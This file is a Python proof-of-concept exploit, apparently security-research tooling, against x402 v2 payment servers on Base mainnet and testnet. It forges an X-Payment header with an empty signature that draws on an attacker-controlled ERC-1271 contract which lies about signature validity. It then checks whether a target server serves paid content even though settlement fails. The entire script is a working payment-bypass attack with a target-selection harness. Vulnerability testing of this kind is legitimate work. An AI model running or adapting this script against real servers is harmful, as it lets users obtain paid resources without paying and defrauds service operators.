import os
import sys
import time
import secrets
import json
from base64 import urlsafe_b64encode

from simplebase import *  # noqa: F401,F403
import config
from config import pk1, pk2
from target import current_target


def _resolve_target_name() -> str:
    for flag in ("-t", "--target"):
        if flag in sys.argv:
            idx = sys.argv.index(flag)
            try:
                return sys.argv[idx + 1]
            except IndexError as exc:
                raise SystemExit("Missing target name after -t/--target") from exc
    if len(sys.argv) > 1:
        return sys.argv[1]
    env_target = os.getenv("TARGET")
    if env_target:
        return env_target
    raise SystemExit("Please specify a target via -t/--target, positional arg, or TARGET env")


# Chain presets keyed by network name
CHAIN_PRESETS = {
    "base": {
        "chainid": 8453,
        "name": "base",
        "usdc": "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
        "usdc_version": "2",
        "usdc_name": "USD Coin",
        "endpoints": [
            "https://mainnet.base.org",
            "https://base.public.blockpi.network/v1/rpc/public",
            "https://base-rpc.publicnode.com",
        ],
    },
    "base-sepolia": {
        "chainid": 84532,
        "name": "base-sepolia",
        "usdc": "0x036CbD53842c5426634e7929541eC2318f3dCF7e",
        "usdc_version": "2",
        "usdc_name": "USDC",
        "endpoints": [
            "https://base-sepolia.drpc.org",
            "https://sepolia.base.org",
            "https://base-sepolia-rpc.publicnode.com",
        ],
    },
}


def _resolve_contract(chain_key: str) -> str:
    """Pick contract by CLI/env or per-network default."""
    for flag in ("-c", "--contract"):
        if flag in sys.argv:
            idx = sys.argv.index(flag)
            try:
                return sys.argv[idx + 1]
            except IndexError as exc:
                raise SystemExit("Missing contract address after -c/--contract") from exc
    env_contract = os.getenv("CONTRACT")
    if env_contract:
        return env_contract
    defaults = {
        # sanitized
        # "base": "",       # mainnet blockbasefee
        # "base-sepolia": "",  # sepolia
    }
    return defaults.get(chain_key, defaults["base"])


# Target + chain setup
# Keep this setup intentionally parallel to erc1271test.py. The v2 script only
# changes the X-Payment envelope from x402 v1 to x402 v2.
target = current_target(_resolve_target_name())
chain_key = target.network
if chain_key not in CHAIN_PRESETS:
    raise ValueError(f"Unsupported chain_name '{chain_key}'. Known: {', '.join(CHAIN_PRESETS)}")
chain_cfg = CHAIN_PRESETS[chain_key]

chainid = chain_cfg["chainid"]
# x402 v2 Coinbase expects CAIP-2 network ids, while erc1271test.py uses target.network for v1.
CHAINNAME = f"eip155:{chainid}"
USDC = chain_cfg["usdc"]
USDC_version = chain_cfg["usdc_version"]
USDC_name = chain_cfg["usdc_name"]
p = Endpoint_Provider(chain_cfg["endpoints"])

# when testing testnet, we are using 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A pk = '1'*64
testnet_pk = "1" * 64  # addr 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
use_testnet_key = chain_key.endswith("sepolia")
pk = testnet_pk if use_testnet_key else pk1
config.privatekey = pk  # keep simplebase helpers aligned
MYADDR = topub(pk)
payto = target.pay_to_address or topub(pk2)
payamount = target.pay_amount
url = target.needpay_url

# contract under test (attacker-controlled)
CONTRACT = _resolve_contract(chain_key)


def run(target_name=None):
    if target_name:
        os.environ["TARGET"] = target_name

    # The script checks for a vulnerability where:
    # verify succeeds (because the malicious contract lies about signature validity),
    # but settlement fails, yet the server still grants access to paid content.
    nonce_bytes = secrets.token_bytes(32)
    sig = "" # random sig
    now = int(time.time())
    valid_after = now + target.valid_after_offset
    valid_before = now + target.valid_before_offset

    accepted = {
        "scheme": "exact",
        "network": CHAINNAME,
        "asset": USDC,
        "amount": str(payamount),
        "payTo": payto,
        "maxTimeoutSeconds": 60,
        "extra": {
            "name": USDC_name,
            "version": USDC_version,
        },
    }

    paymentheader = urlsafe_b64encode(json.dumps({
        "x402Version": 2,
        "resource": {
            "url": url,
            "description": "",
            "mimeType": "",
        },
        "accepted": accepted,
        "payload": {
            "signature": sig,
            "authorization": {
                "from": CONTRACT,
                "to": payto,
                "value": str(payamount),
                "validAfter": str(valid_after),
                "validBefore": str(valid_before),
                "nonce": b16e(nonce_bytes),
            },
        },
    }).encode("ascii")).decode()

    bal = p.erc20_balanceOf(USDC, CONTRACT)
    print(f"MYADDR: {MYADDR}")
    print(f"CONTRACT: {CONTRACT}")
    print(bal / 1e6)
    assert bal > payamount
    x = getsess().get(url, headers={"X-Payment": paymentheader})
    print(x)
    print("X-Settle-Status:", x.headers.get("X-Settle-Status"))
    if x.status_code != 200:
        print(x.text)
    else:
        print(x.text)


def main():
    run()


if __name__ == "__main__":
    main()
